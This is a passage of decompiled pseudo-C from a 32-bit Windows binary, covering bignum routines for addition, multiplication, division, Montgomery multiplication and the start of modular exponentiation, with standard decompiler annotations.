    if ( !result )
      *a1 = v5;
  }
  return result;
}

//----- (00408430) --------------------------------------------------------
int __usercall sub_408430@<eax>(_DWORD *a1@<eax>, int *a2@<ebx>, _DWORD *a3@<esi>)
{
  int result; // eax
  int v5; // [esp+4h] [ebp-4h]

  v5 = *a2;
  if ( *a2 * *a3 <= 0 )
  {
    result = sub_4080E0(a2, a1, a3);
    if ( !result )
      *a1 = v5;
  }
  else if ( sub_407FA0((int)a3, (int)a2) < 0 )
  {
    result = sub_4082F0((int)a2, (int)a1, (int)a3);
    if ( !result )
      *a1 = -v5;
  }
  else
  {
    result = sub_4082F0((int)a3, (int)a1, (int)a2);
    if ( !result )
      *a1 = v5;
  }
  return result;
}

//----- (004084A0) --------------------------------------------------------
unsigned int __cdecl sub_4084A0(unsigned int a1, unsigned int *a2, unsigned int *a3, unsigned int a4)
{
  unsigned int result; // eax
  unsigned int v5; // ecx
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // rax
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // rax
  unsigned int v21; // ecx
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // rax
  unsigned __int64 v24; // rax
  unsigned __int64 v25; // rax
  unsigned __int64 v26; // rax
  unsigned __int64 v27; // rax
  unsigned __int64 v28; // rax
  unsigned __int64 v29; // rax
  _DWORD *v30; // ecx
  unsigned int v31; // [esp+Ch] [ebp-8h]
  unsigned int v32; // [esp+Ch] [ebp-8h]
  unsigned int v33; // [esp+10h] [ebp-4h]

  result = 0;
  v33 = 0;
  if ( a1 >= 0x10 )
  {
    v31 = a1 >> 4;
    do
    {
      v5 = (*a3 + v33 + a4 * (unsigned __int64)*a2) >> 32;
      *a3 += v33 + a4 * *a2;
      v6 = a3[1] + v5 + a4 * (unsigned __int64)a2[1];
      a3[1] = v6;
      v7 = a3[2] + HIDWORD(v6) + a4 * (unsigned __int64)a2[2];
      a3[2] = v7;
      v8 = a3[3] + HIDWORD(v7) + a4 * (unsigned __int64)a2[3];
      a3[3] = v8;
      v9 = a3[4] + HIDWORD(v8) + a4 * (unsigned __int64)a2[4];
      a3[4] = v9;
      v10 = a3[5] + HIDWORD(v9) + a4 * (unsigned __int64)a2[5];
      a3[5] = v10;
      v11 = a3[6] + HIDWORD(v10) + a4 * (unsigned __int64)a2[6];
      a3[6] = v11;
      v12 = a3[7] + HIDWORD(v11) + a4 * (unsigned __int64)a2[7];
      a3[7] = v12;
      v13 = a3[8] + HIDWORD(v12) + a4 * (unsigned __int64)a2[8];
      a3[8] = v13;
      v14 = a3[9] + HIDWORD(v13) + a4 * (unsigned __int64)a2[9];
      a3[9] = v14;
      v15 = a3[10] + HIDWORD(v14) + a4 * (unsigned __int64)a2[10];
      a3[10] = v15;
      v16 = a3[11] + HIDWORD(v15) + a4 * (unsigned __int64)a2[11];
      a3[11] = v16;
      v17 = a3[12] + HIDWORD(v16) + a4 * (unsigned __int64)a2[12];
      a3[12] = v17;
      v18 = a3[13] + HIDWORD(v17) + a4 * (unsigned __int64)a2[13];
      a3[13] = v18;
      v19 = a3[14] + HIDWORD(v18) + a4 * (unsigned __int64)a2[14];
      a3[14] = v19;
      v20 = a3[15] + HIDWORD(v19) + a4 * (unsigned __int64)a2[15];
      a3[15] = v20;
      v33 = HIDWORD(v20);
      a3 += 16;
      a2 += 16;
      a1 -= 16;
      --v31;
    }
    while ( v31 );
    result = HIDWORD(v20);
  }
  if ( a1 >= 8 )
  {
    v32 = a1 >> 3;
    do
    {
      v21 = (*a3 + v33 + a4 * (unsigned __int64)*a2) >> 32;
      *a3 += v33 + a4 * *a2;
      v22 = a3[1] + v21 + a4 * (unsigned __int64)a2[1];
      a3[1] = v22;
      v23 = a3[2] + HIDWORD(v22) + a4 * (unsigned __int64)a2[2];
      a3[2] = v23;
      v24 = a3[3] + HIDWORD(v23) + a4 * (unsigned __int64)a2[3];
      a3[3] = v24;
      v25 = a3[4] + HIDWORD(v24) + a4 * (unsigned __int64)a2[4];
      a3[4] = v25;
      v26 = a3[5] + HIDWORD(v25) + a4 * (unsigned __int64)a2[5];
      a3[5] = v26;
      v27 = a3[6] + HIDWORD(v26) + a4 * (unsigned __int64)a2[6];
      a3[6] = v27;
      v28 = a3[7] + HIDWORD(v27) + a4 * (unsigned __int64)a2[7];
      a3[7] = v28;
      v33 = HIDWORD(v28);
      a3 += 8;
      a2 += 8;
      a1 -= 8;
      --v32;
    }
    while ( v32 );
    result = HIDWORD(v28);
  }
  if ( a1 )
  {
    do
    {
      v29 = *a3 + v33 + a4 * (unsigned __int64)*a2;
      *a3 = v29;
      v33 = HIDWORD(v29);
      ++a3;
      ++a2;
      --a1;
    }
    while ( a1 );
    result = HIDWORD(v29);
  }
  v30 = a3;
  do
  {
    *v30 += result;
    result = *a3 < v33;
    v30 = a3 + 1;
    v33 = result;
    ++a3;
  }
  while ( result );
  return result;
}

//----- (00408710) --------------------------------------------------------
int __usercall sub_408710@<eax>(int *a1@<esi>, int *a2, int *a3)
{
  int *v3; // edi
  int v4; // edi
  int *v5; // ecx
  unsigned int v6; // ebx
  _DWORD *v7; // eax
  int v8; // edi
  _DWORD *v9; // eax
  unsigned int v10; // ecx
  const __m128i *v11; // eax
  unsigned int v12; // ebx
  int v13; // eax
  const __m128i *v14; // eax
  LPVOID v15; // ecx
  int v17; // [esp-Ch] [ebp-34h]
  unsigned int v18; // [esp-4h] [ebp-2Ch]
  int v19; // [esp+8h] [ebp-20h] BYREF
  int v20; // [esp+Ch] [ebp-1Ch]
  LPVOID v21; // [esp+10h] [ebp-18h]
  int v22; // [esp+14h] [ebp-14h] BYREF
  int v23; // [esp+18h] [ebp-10h]
  LPVOID lpMem; // [esp+1Ch] [ebp-Ch]
  unsigned int v25; // [esp+20h] [ebp-8h]
  unsigned int v26; // [esp+24h] [ebp-4h]

  v3 = a2;
  v19 = 1;
  v20 = 0;
  v21 = 0;
  v22 = 1;
  v23 = 0;
  lpMem = 0;
  if ( a1 == a2 )
  {
    v4 = sub_407770(&v19, a2);
    if ( v4 )
      goto LABEL_44;
    a2 = &v19;
    v3 = &v19;
  }
  v5 = a3;
  if ( a1 != a3 )
  {
LABEL_7:
    v6 = v3[1];
    v26 = v6;
    if ( v6 )
    {
      v7 = (_DWORD *)(v3[2] + 4 * v6 - 4);
      do
      {
        if ( *v7 )
          break;
        --v7;
        --v6;
      }
      while ( v6 );
      v26 = v6;
    }
    v8 = v5[1];
    if ( v8 )
    {
      v9 = (_DWORD *)(a3[2] + 4 * v8 - 4);
      do
      {
        if ( *v9 )
          break;
        --v9;
        --v8;
      }
      while ( v8 );
    }
    if ( v8 + v6 > 0x2710 )
    {
      v26 = -16;
      goto LABEL_39;
    }
    if ( a1[1] < v8 + v6 )
    {
      v10 = off_423FA0(v8 + v6, 4);
      v25 = v10;
      if ( !v10 )
      {
        v26 = -16;
        goto LABEL_39;
      }
      v11 = (const __m128i *)a1[2];
      if ( v11 )
      {
        sub_415930(v10, v11, 4 * a1[1]);
        if ( 4 * a1[1] )
          sub_413EB0(a1[2], 0, 4 * a1[1]);
        off_423FA4(a1[2]);
        v10 = v25;
      }
      a1[1] = v8 + v6;
      a1[2] = v10;
    }
    if ( !a1[1] )
    {
      v12 = off_423FA0(1, 4);
      if ( !v12 )
      {
        v13 = -16;
        v6 = v26;
        goto LABEL_35;
      }
      v14 = (const __m128i *)a1[2];
      if ( v14 )
      {
        sub_415930(v12, v14, 4 * a1[1]);
        if ( 4 * a1[1] )
          sub_413EB0(a1[2], 0, 4 * a1[1]);
        off_423FA4(a1[2]);
      }
      a1[2] = v12;
      v6 = v26;
      a1[1] = 1;
    }
    v18 = 4 * a1[1];
    v17 = a1[2];
    v25 = 0;
    sub_413EB0(v17, 0, v18);
    *(_DWORD *)a1[2] = 0;
    v13 = v25;
    *a1 = 1;
LABEL_35:
    v26 = v13;
    if ( !v13 )
    {
      for ( ; v8; --v8 )
        sub_4084A0(v6, (unsigned int *)a2[2], (unsigned int *)(a1[2] + 4 * v8 - 4), *(_DWORD *)(a3[2] + 4 * v8 - 4));
      *a1 = *a3 * *a2;
    }
    goto LABEL_39;
  }
  v26 = sub_407770(&v22, a3);
  if ( !v26 )
  {
    v5 = &v22;
    a3 = &v22;
    goto LABEL_7;
  }
LABEL_39:
  v15 = lpMem;
  if ( lpMem )
  {
    if ( 4 * v23 )
    {
      sub_413EB0((int)lpMem, 0, 4 * v23);
      v15 = lpMem;
    }
    off_423FA4(v15);
  }
  v4 = v26;
LABEL_44:
  if ( v21 )
  {
    if ( 4 * v20 )
      sub_413EB0((int)v21, 0, 4 * v20);
    off_423FA4(v21);
  }
  return v4;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (00408990) --------------------------------------------------------
int __usercall sub_408990@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v4[3]; // [esp+0h] [ebp-10h] BYREF
  int v5; // [esp+Ch] [ebp-4h] BYREF

  v4[0] = 1;
  v4[1] = 1;
  v4[2] = (int)&v5;
  v5 = a1;
  return sub_408710(a2, a3, v4);
}

//----- (004089C0) --------------------------------------------------------
int __cdecl sub_4089C0(int *a1, int *a2, int *a3)
{
  int v4; // esi
  unsigned int v5; // eax
  unsigned int v6; // ebx
  int v7; // edi
  unsigned int v8; // ebx
  int *v9; // edi
  unsigned int v10; // ecx
  unsigned int v11; // eax
  unsigned int v12; // eax
  int v13; // edx
  unsigned int v14; // edi
  unsigned int v15; // edx
  int v16; // ecx
  _DWORD *v17; // eax
  int *v18; // ecx
  int v19; // edx
  int v20; // eax
  _DWORD *v21; // edx
  _DWORD *v22; // ecx
  int v23; // eax
  int v24[3]; // [esp+10h] [ebp-94h] BYREF
  int v25[3]; // [esp+1Ch] [ebp-88h] BYREF
  int v26[3]; // [esp+28h] [ebp-7Ch] BYREF
  int v27; // [esp+34h] [ebp-70h] BYREF
  int v28; // [esp+38h] [ebp-6Ch]
  unsigned int *v29; // [esp+3Ch] [ebp-68h]
  int v30; // [esp+48h] [ebp-5Ch] BYREF
  int v31; // [esp+4Ch] [ebp-58h] BYREF
  int v32; // [esp+50h] [ebp-54h] BYREF
  int v33; // [esp+54h] [ebp-50h]
  LPVOID v34; // [esp+58h] [ebp-4Ch]
  int v35; // [esp+5Ch] [ebp-48h] BYREF
  int v36; // [esp+60h] [ebp-44h]
  LPVOID v37; // [esp+64h] [ebp-40h]
  unsigned int v38; // [esp+68h] [ebp-3Ch]
  unsigned int v39; // [esp+6Ch] [ebp-38h] BYREF
  int v40; // [esp+70h] [ebp-34h] BYREF
  int v41; // [esp+74h] [ebp-30h] BYREF
  int v42; // [esp+78h] [ebp-2Ch]
  LPVOID v43; // [esp+7Ch] [ebp-28h]
  unsigned int v44; // [esp+80h] [ebp-24h]
  int v45; // [esp+84h] [ebp-20h] BYREF
  int v46; // [esp+88h] [ebp-1Ch]
  LPVOID v47; // [esp+8Ch] [ebp-18h]
  unsigned int v48; // [esp+90h] [ebp-14h]
  int *v49; // [esp+94h] [ebp-10h]
  int v50; // [esp+98h] [ebp-Ch] BYREF
  int v51; // [esp+9Ch] [ebp-8h]
  LPVOID lpMem; // [esp+A0h] [ebp-4h]

  v40 = 0;
  v39 = 0;
  v29 = &v39;
  v27 = 1;
  v28 = 1;
  if ( !sub_408030(&v27, a3) )
    return -12;
  v50 = 1;
  v51 = 0;
  lpMem = 0;
  v45 = 1;
  v46 = 0;
  v47 = 0;
  v35 = 1;
  v36 = 0;
  v37 = 0;
  v41 = 1;
  v42 = 0;
  v43 = 0;
  v32 = 1;
  v33 = 0;
  v34 = 0;
  if ( sub_407FA0((int)a3, (int)a2) >= 0 )
  {
    v4 = sub_407770(&v50, a2);
    if ( v4 )
      goto LABEL_61;
    v4 = sub_407770(&v45, a3);
    if ( v4 )
      goto LABEL_61;
    v45 = 1;
    v50 = 1;
    v4 = sub_4076F0(a2[1] + 2, (int)&v35);
    if ( v4 )
      goto LABEL_61;
    v4 = sub_407880(0, &v35);
    if ( v4 )
      goto LABEL_61;
    v4 = sub_4076F0(2u, (int)&v41);
    if ( v4 )
      goto LABEL_61;
    v4 = sub_4076F0(3u, (int)&v32);
    if ( v4 )
      goto LABEL_61;
    v5 = sub_407920((int)&v45) & 0x1F;
    if ( v5 >= 0x1F )
    {
      v39 = 0;
    }
    else
    {
      v6 = 31 - v5;
      v39 = 31 - v5;
      v4 = sub_407D70(31 - v5, (int)&v50);
      if ( v4 )
        goto LABEL_61;
      v4 = sub_407D70(v6, (int)&v45);
      if ( v4 )
        goto LABEL_61;
    }
    v48 = v51 - 1;
    v7 = v51 - v46;
    v38 = v46 - 1;
    v44 = 32 * (v51 - v46);
    v4 = sub_407D70(v44, (int)&v45);
    if ( !v4 )
    {
      while ( sub_408030(&v45, &v50) >= 0 )
      {
        ++*((_DWORD *)v37 + v7);
        v4 = sub_408430(&v50, &v50, &v45);
        if ( v4 )
          goto LABEL_61;
      }
      v8 = v44;
      v4 = sub_407EC0(v44, &v45);
      if ( !v4 )
      {
        v44 = v48;
        if ( v48 > v38 )
        {
          v9 = (int *)((char *)v37 + 4 * v7 - 4);
          v48 = v8 - 32;
          v49 = v9;
LABEL_26:
          v10 = *((_DWORD *)lpMem + v44);
          v11 = *((_DWORD *)v47 + v38);
          if ( v10 >= v11 )
          {
            *v9 = -1;
            goto LABEL_34;
          }
          if ( v11 && v10 < v11 )
          {
            v12 = sub_418590(*(_QWORD *)((char *)lpMem + 4 * v44 - 4), v11);
            if ( !v13 )
            {
LABEL_33:
              *v9 = v12;
LABEL_34:
              ++*v9;
              v14 = v44;
              while ( 1 )
              {
                --*v49;
                v4 = sub_407880(0, &v41);
                if ( v4 )
                  goto LABEL_61;
                v15 = v38;
                v16 = v38 ? *((_DWORD *)v47 + v38 - 1) : 0;
                v17 = v43;
                *(_DWORD *)v43 = v16;
                v18 = v49;
                v17[1] = *((_DWORD *)v47 + v15);
                v19 = *v18;
                v25[2] = (int)&v31;
                v25[0] = 1;
                v25[1] = 1;
                v31 = v19;
                v4 = sub_408710(&v41, &v41, v25);
                if ( v4 )
                  goto LABEL_61;
                v20 = sub_407880(0, &v32);
                v4 = v20;
                if ( v20 )
                  goto LABEL_61;
                v21 = lpMem;
                if ( v14 >= 2 )
                  v20 = *((_DWORD *)lpMem + v14 - 2);
                v22 = v34;
                *(_DWORD *)v34 = v20;
                if ( v14 )
                  v23 = v21[v14 - 1];
                else
                  v23 = 0;
                v22[1] = v23;
                v22[2] = v21[v14];
                if ( sub_408030(&v32, &v41) <= 0 )
                {
                  v4 = sub_408990(*v49, &v41, &v45);
                  if ( v4 )
                    goto LABEL_61;
                  v4 = sub_407D70(v48, (int)&v41);
                  if ( v4 )
                    goto LABEL_61;
                  v4 = sub_408430(&v50, &v50, &v41);
                  if ( v4 )
                    goto LABEL_61;
                  v26[0] = 1;
                  v26[1] = 1;
                  v26[2] = (int)&v30;
                  v30 = v40;
                  if ( sub_408030(v26, &v50) < 0 )
                  {
                    v4 = sub_407770(&v41, &v45);
                    if ( v4 )
                      goto LABEL_61;
                    v4 = sub_407D70(v48, (int)&v41);
                    if ( v4 )
                      goto LABEL_61;
                    v4 = sub_4083C0(&v50, &v50, &v41);
                    if ( v4 )
                      goto LABEL_61;
                    --*v49;
                  }
                  v48 -= 32;
                  --v49;
                  v44 = v14 - 1;
                  if ( v14 - 1 > v38 )
                  {
                    v9 = v49;
                    goto LABEL_26;
                  }
                  goto LABEL_56;
                }
              }
            }
            v28 = 0;
          }
          v12 = -1;
          goto LABEL_33;
        }
LABEL_56:
        if ( a1 )
        {
          v4 = sub_407EC0(v39, &v50);
          if ( !v4 )
          {
            v50 = *a2;
            v4 = sub_407770(a1, &v50);
            if ( !v4 )
            {
              v24[2] = (int)&v40;
              v24[0] = 1;
              v24[1] = 1;
              if ( !sub_408030(v24, a1) )
                *a1 = 1;
            }
          }
        }
      }
    }
LABEL_61:
    if ( lpMem )
    {
      if ( 4 * v51 )
        sub_413EB0((int)lpMem, 0, 4 * v51);
      off_423FA4(lpMem);
    }
    if ( v47 )
    {
      if ( 4 * v46 )
        sub_413EB0((int)v47, 0, 4 * v46);
      off_423FA4(v47);
    }
    if ( v37 )
    {
      if ( 4 * v36 )
        sub_413EB0((int)v37, 0, 4 * v36);
      off_423FA4(v37);
    }
    if ( v43 )
    {
      if ( 4 * v42 )
        sub_413EB0((int)v43, 0, 4 * v42);
      off_423FA4(v43);
    }
    if ( v34 )
    {
      if ( 4 * v33 )
        sub_413EB0((int)v34, 0, 4 * v33);
      off_423FA4(v34);
    }
    return v4;
  }
  if ( !a1 )
    return 0;
  v4 = sub_407770(a1, a2);
  if ( !v4 )
    return 0;
  return v4;
}
// 408C20: variable 'v13' is possibly undefined
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (00408F10) --------------------------------------------------------
int __usercall sub_408F10@<eax>(int *a1@<eax>, int *a2@<esi>, int *a3)
{
  int result; // eax
  int v5; // ebx
  int v6; // eax
  int v7; // ebx
  int v8; // eax
  int v9; // [esp+8h] [ebp-14h] BYREF
  int v10; // [esp+Ch] [ebp-10h]
  int *v11; // [esp+10h] [ebp-Ch]
  int v12; // [esp+14h] [ebp-8h] BYREF
  int v13; // [esp+18h] [ebp-4h] BYREF

  v9 = 1;
  v10 = 1;
  v11 = &v12;
  v12 = 0;
  if ( sub_408030(&v9, a2) < 0 )
    return -10;
  result = sub_4089C0(a1, a3, a2);
  v12 = result;
  if ( !result )
  {
    v9 = 1;
    v10 = 1;
    v13 = 0;
    v11 = &v13;
    if ( sub_408030(&v9, a1) < 0 )
    {
      v13 = 0;
      while ( 1 )
      {
        v5 = *a1;
        if ( *a1 * *a2 >= 0 )
          break;
        if ( sub_407FA0((int)a2, (int)a1) >= 0 )
        {
          v6 = sub_4082F0((int)a2, (int)a1, (int)a1);
          goto LABEL_12;
        }
        v6 = sub_4082F0((int)a1, (int)a1, (int)a2);
        if ( !v6 )
        {
          v5 = -v5;
LABEL_13:
          *a1 = v5;
        }
LABEL_14:
        v12 = v6;
        if ( v6 )
          return v12;
        v9 = 1;
        v10 = 1;
        v11 = &v13;
        if ( sub_408030(&v9, a1) >= 0 )
          goto LABEL_16;
      }
      v6 = sub_4080E0(a1, a1, a2);
LABEL_12:
      if ( !v6 )
        goto LABEL_13;
      goto LABEL_14;
    }
LABEL_16:
    if ( sub_408030(a2, a1) >= 0 )
    {
      while ( 1 )
      {
        v7 = *a1;
        if ( *a1 * *a2 <= 0 )
          break;
        if ( sub_407FA0((int)a2, (int)a1) >= 0 )
        {
          v8 = sub_4082F0((int)a2, (int)a1, (int)a1);
          goto LABEL_23;
        }
        v8 = sub_4082F0((int)a1, (int)a1, (int)a2);
        if ( v8 )
          goto LABEL_25;
        v7 = -v7;
LABEL_24:
        *a1 = v7;
LABEL_25:
        v12 = v8;
        if ( v8 || sub_408030(a2, a1) < 0 )
          return v12;
      }
      v8 = sub_4080E0(a1, a1, a2);
LABEL_23:
      if ( v8 )
        goto LABEL_25;
      goto LABEL_24;
    }
    return v12;
  }
  return result;
}

//----- (00409080) --------------------------------------------------------
int __usercall sub_409080@<eax>(int a1@<eax>, int *a2)
{
  int v2; // ecx
  int v3; // eax
  unsigned int i; // edx
  int result; // eax

  v2 = **(_DWORD **)(a1 + 8);
  v3 = v2 + ((2 * (_BYTE)v2 + 4) & 8);
  for ( i = 32; i >= 8; i >>= 1 )
    v3 *= 2 - v2 * v3;
  result = -v3;
  *a2 = result;
  return result;
}

//----- (004090D0) --------------------------------------------------------
int __cdecl sub_4090D0(int a1, int a2, int a3, int a4, int a5)
{
  unsigned int v5; // eax
  int v6; // esi
  __m128i *v7; // edi
  unsigned int v8; // ebx
  unsigned int v9; // esi
  unsigned int v11; // [esp+8h] [ebp-Ch]
  unsigned int v12; // [esp+Ch] [ebp-8h]
  unsigned int v13; // [esp+10h] [ebp-4h]

  v5 = *(_DWORD *)(a5 + 4);
  v6 = a3;
  if ( v5 < *(_DWORD *)(a3 + 4) + 1 )
    return -4;
  v7 = *(__m128i **)(a5 + 8);
  if ( !v7 )
    return -4;
  sub_413EB0((int)v7, 0, 4 * v5);
  v8 = *(_DWORD *)(a3 + 4);
  v12 = *(_DWORD *)(a2 + 4);
  if ( v12 >= v8 )
    v12 = *(_DWORD *)(a3 + 4);
  v13 = 0;
  if ( v8 )
  {
    do
    {
      v9 = a4 * (v7->m128i_i32[0] + *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v13) * **(_DWORD **)(a2 + 8));
      v11 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v13);
      sub_4084A0(v12, *(unsigned int **)(a2 + 8), (unsigned int *)v7, v11);
      sub_4084A0(v8, *(unsigned int **)(a3 + 8), (unsigned int *)v7, v9);
      v7->m128i_i32[0] = v11;
      v7 = (__m128i *)((char *)v7 + 4);
      v7->m128i_i32[v8 + 1] = 0;
      ++v13;
    }
    while ( v13 < v8 );
    v6 = a3;
  }
  sub_415930(*(_DWORD *)(a1 + 8), v7, 4 * v8 + 4);
  if ( sub_407FA0(v6, a1) < 0 )
    sub_408290(*(unsigned int **)(a5 + 8), v8, *(_DWORD *)(a1 + 8));
  else
    sub_408290(*(unsigned int **)(a1 + 8), v8, *(_DWORD *)(v6 + 8));
  return 0;
}

//----- (004091F0) --------------------------------------------------------
int __fastcall sub_4091F0(int a1, int a2, int a3, int a4)
{
  int v5[3]; // [esp+0h] [ebp-10h] BYREF
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v6 = 1;
  v5[0] = 1;
  v5[1] = 1;
  v5[2] = (int)&v6;
  return sub_4090D0(a3, (int)v5, a4, a2, a1);
}

//----- (00409230) --------------------------------------------------------
int __usercall sub_409230@<eax>(int a1@<eax>, _DWORD *a2, int *a3, int a4, int *a5)
{
  unsigned int v6; // eax
  unsigned int v7; // ebx
  int v8; // esi
  int v9; // edx
  void *v10; // eax
  int v11; // ecx
  LPVOID v12; // edx
  int v13; // eax
  unsigned int v14; // ebx
  _DWORD *v15; // ebx
  int v16; // edx
  int v17; // esi
  unsigned int v18; // ebx
  int v19; // eax
  int v20; // eax
  int v21; // ebx
  unsigned int v22; // eax
  int *v23; // edi
  int v24; // ebx
  LPVOID v25; // ecx
  _DWORD v27[3]; // [esp+10h] [ebp-668h] BYREF
  int v28; // [esp+1Ch] [ebp-65Ch] BYREF
  int v29; // [esp+20h] [ebp-658h]
  LPVOID lpMem; // [esp+24h] [ebp-654h]
  int v31[3]; // [esp+614h] [ebp-64h] BYREF
  int v32[3]; // [esp+620h] [ebp-58h] BYREF
  int v33[3]; // [esp+62Ch] [ebp-4Ch] BYREF
  BOOL v34; // [esp+638h] [ebp-40h]
  int v35; // [esp+63Ch] [ebp-3Ch] BYREF
  int v36; // [esp+640h] [ebp-38h]
  LPVOID v37; // [esp+644h] [ebp-34h]
  int v38; // [esp+648h] [ebp-30h] BYREF
  int v39; // [esp+64Ch] [ebp-2Ch]
  LPVOID v40; // [esp+650h] [ebp-28h]
  int v41; // [esp+654h] [ebp-24h] BYREF
  int v42; // [esp+658h] [ebp-20h]
  LPVOID v43; // [esp+65Ch] [ebp-1Ch]
  int v44; // [esp+660h] [ebp-18h] BYREF
  _DWORD *v45; // [esp+664h] [ebp-14h]
  int v46; // [esp+668h] [ebp-10h] BYREF
  signed int v47; // [esp+66Ch] [ebp-Ch] BYREF
  unsigned int v48; // [esp+670h] [ebp-8h]
  unsigned int v49; // [esp+674h] [ebp-4h] BYREF

  v31[0] = 1;
  v31[1] = 1;
  v31[2] = (int)&v44;
  v44 = 0;
  if ( sub_408030(v31, (int *)a1) <= 0 )
    return -4;
  if ( (**(_BYTE **)(a1 + 8) & 1) == 0 )
    return -4;
  v47 = 0;
  v33[0] = 1;
  v33[1] = 1;
  v33[2] = (int)&v47;
  if ( sub_408030(v33, (int *)a4) < 0 )
    return -4;
  sub_409080(a1, &v46);
  v41 = 1;
  v42 = 0;
  v43 = 0;
  v38 = 1;
  v39 = 0;
  v40 = 0;
  v35 = 1;
  v36 = 0;
  v37 = 0;
  sub_413EB0((int)v27, 0, 0x600u);
  v6 = sub_407920(a4);
  if ( v6 <= 0x29F )
  {
    if ( v6 <= 0xEF )
    {
      if ( v6 <= 0x4F )
        v48 = v6 > 0x17 ? 3 : 1;
      else
        v48 = 4;
    }
    else
    {
      v48 = 5;
    }
  }
  else
  {
    v48 = 6;
  }
  v7 = *(_DWORD *)(a1 + 4) + 1;
  v8 = sub_4076F0(v7, (int)a2);
  if ( !v8 )
  {
    v8 = sub_4076F0(v7, (int)&v28);
    if ( !v8 )
    {
      v8 = sub_4076F0(2 * v7, (int)&v38);
      if ( !v8 )
      {
        v34 = *a3 == -1;
        if ( v34 )
        {
          v8 = sub_407770(&v35, a3);
          if ( v8 )
            goto LABEL_70;
          v35 = 1;
          a3 = &v35;
        }
        if ( a5 && a5[2] )
        {
          v9 = a5[1];
          v10 = (void *)a5[2];
          v41 = *a5;
          v42 = v9;
          v43 = v10;
        }
        else
        {
          v8 = sub_407880(1, &v41);
          if ( v8 )
            goto LABEL_70;
          v8 = sub_407D70(*(_DWORD *)(a1 + 4) << 6, (int)&v41);
          if ( v8 )
            goto LABEL_70;
          v8 = sub_408F10(&v41, (int *)a1, &v41);
          if ( v8 )
            goto LABEL_70;
          if ( a5 )
          {
            v11 = v42;
            *a5 = v41;
            v12 = v43;
            a5[1] = v11;
            a5[2] = (int)v12;
          }
        }
        v13 = sub_408030((int *)a1, a3) < 0 ? sub_407770(&v28, a3) : sub_408F10(&v28, (int *)a1, a3);
        v8 = v13;
        if ( !v13 )
        {
          v8 = sub_4090D0((int)&v28, (int)&v41, a1, v46, (int)&v38);
          if ( !v8 )
          {
            v8 = sub_407770(a2, &v41);
            if ( !v8 )
            {
              v8 = sub_4091F0((int)&v38, v46, (int)a2, a1);
              if ( !v8 )
              {
                if ( v48 > 1 )
                {
                  v14 = *(_DWORD *)(a1 + 4) + 1;
                  v44 = 1 << (v48 - 1);
                  v45 = &v27[3 * v44];
                  v8 = sub_4076F0(v14, (int)v45);
                  if ( v8 )
                    goto LABEL_70;
                  v15 = v45;
                  v8 = sub_407770(v45, &v28);
                  if ( v8 )
                    goto LABEL_70;
                  v49 = 0;
                  if ( v48 != 1 )
                  {
                    do
                    {
                      v8 = sub_4090D0((int)v15, (int)v15, a1, v46, (int)&v38);
                      if ( v8 )
                        goto LABEL_70;
                      ++v49;
                    }
                    while ( v49 < v48 - 1 );
                  }
                  v49 = v44 + 1;
                  v45 = (_DWORD *)(1 << v48);
                  if ( v44 + 1 < (unsigned int)(1 << v48) )
                  {
                    v47 = (signed int)&v27[3 * v44 + 3];
                    do
                    {
                      v8 = sub_4076F0(*(_DWORD *)(a1 + 4) + 1, v47);
                      if ( v8 )
                        goto LABEL_70;
                      v8 = sub_407770((_DWORD *)v47, (_DWORD *)(v47 - 12));
                      if ( v8 )
                        goto LABEL_70;
                      v8 = sub_4090D0(v47, (int)&v28, a1, v46, (int)&v38);
                      if ( v8 )
                        goto LABEL_70;
                      v47 += 12;
                      ++v49;
                    }
                    while ( v49 < (unsigned int)v45 );
                  }
                }
                v49 = *(_DWORD *)(a4 + 4);
                v16 = 0;
                v17 = 0;
                v18 = 0;
                v47 = 0;
LABEL_45:
                v44 = v16;
                while ( 1 )
                {
                  do
                  {
                    while ( 1 )
                    {
                      if ( !v17 )
                      {
                        if ( !v49 )
                        {
                          v49 = 0;
                          if ( v18 )
                          {
                            while ( 1 )
                            {
                              v8 = sub_4090D0((int)a2, (int)a2, a1, v46, (int)&v38);
                              if ( v8 )
                                break;
                              v47 *= 2;
                              if ( ((1 << v48) & v47) != 0 )
                              {
                                v8 = sub_4090D0((int)a2, (int)&v28, a1, v46, (int)&v38);
                                if ( v8 )
                                  break;
                              }
                              if ( ++v49 >= v18 )
                                goto LABEL_65;
                            }
                          }
                          else
                          {
LABEL_65:
                            v49 = 1;
                            v32[0] = 1;
                            v32[1] = 1;
                            v32[2] = (int)&v49;
                            v8 = sub_4090D0((int)a2, (int)v32, a1, v46, (int)&v38);
                            if ( !v8 && v34 && *(_DWORD *)(a4 + 4) && (**(_BYTE **)(a4 + 8) & 1) != 0 )
                            {
                              *a2 = -1;
                              v8 = sub_4083C0(a2, (int *)a1, a2);
                            }
                          }
                          goto LABEL_70;
                        }
                        --v49;
                        v17 = 32;
                      }
                      v19 = *(_DWORD *)(*(_DWORD *)(a4 + 8) + 4 * v49) >> --v17;
                      v45 = (_DWORD *)v17;
                      v20 = v19 & 1;
                      if ( !v20 )
                        break;
LABEL_54:
                      ++v18;
                      v16 = 2;
                      v44 = 2;
                      v47 |= v20 << (v48 - v18);
                      if ( v18 == v48 )
                      {
                        v21 = 0;
                        if ( v48 )
                        {
                          do
                          {
                            v8 = sub_4090D0((int)a2, (int)a2, a1, v46, (int)&v38);
                            if ( v8 )
                              goto LABEL_70;
                          }
                          while ( ++v21 < v48 );
                        }
                        v8 = sub_4090D0((int)a2, (int)&v27[3 * v47], a1, v46, (int)&v38);
                        if ( v8 )
                          goto LABEL_70;
                        v17 = (int)v45;
                        v18 = 0;
                        v16 = 1;
                        v47 = 0;
                        goto LABEL_45;
                      }
                    }
                  }
                  while ( !v16 );
                  if ( v16 != 1 )
